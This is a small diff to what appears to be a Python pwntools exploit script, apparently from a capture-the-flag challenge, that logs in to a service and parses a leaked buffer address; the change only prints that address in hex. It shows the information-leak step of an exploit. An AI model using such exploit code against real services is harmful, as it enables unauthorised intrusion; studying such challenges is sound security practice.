@@ -37,7 +37,7 @@ p.recvline()  # 'OK Send PASS command.\n'
 p.sendline('PASS beepbeep')
 temp_addr = p.recvline()  # 'Debug: userpass buffer @ 0xff93e350\n'
 leaked_addr = int(temp_addr.strip().split(' ')[-1], 16)
-print "Leaked Address: " + str(leaked_addr)
+print "Leaked Address: " + str(hex(leaked_addr))
 try:
     p.recvlines()
 except EOFError:
